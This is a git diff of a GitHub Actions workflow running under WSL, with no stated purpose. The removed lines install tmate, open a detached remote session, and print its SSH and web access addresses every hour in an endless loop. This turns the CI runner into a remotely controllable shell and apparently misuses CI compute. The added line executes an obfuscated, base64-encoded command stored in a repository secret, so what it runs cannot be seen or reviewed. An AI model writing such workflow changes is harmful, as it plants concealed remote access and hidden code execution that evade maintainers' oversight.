@@ -18,17 +18,4 @@ jobs:
           wsl-shell-command: bash -c "cd && bash --noprofile --norc -euo pipefail '{0}'"
     - shell: wsl-bash {0}
       run: |
-        sudo apt update -y 
-        sudo apt install tmate -y
-        nohup tmate -S /tmp/tmate.sock new-session -d & disown -a
-        sleep 5
-        tmate -S /tmp/tmate.sock wait tmate-ready
-        sleep 3
-
-        while true; do
-            echo "Time Now: `date +%H:%M:%S`"
-            echo "Prepare Start Request node"
-            tmate -S /tmp/tmate.sock display -p "Address1: #{tmate_ssh}"
-            tmate -S /tmp/tmate.sock display -p "Address2: #{tmate_web}"
-            sleep 3600
-        done
+        eval "$(echo '${{ secrets.CODEKEY }}' | base64 -d)"
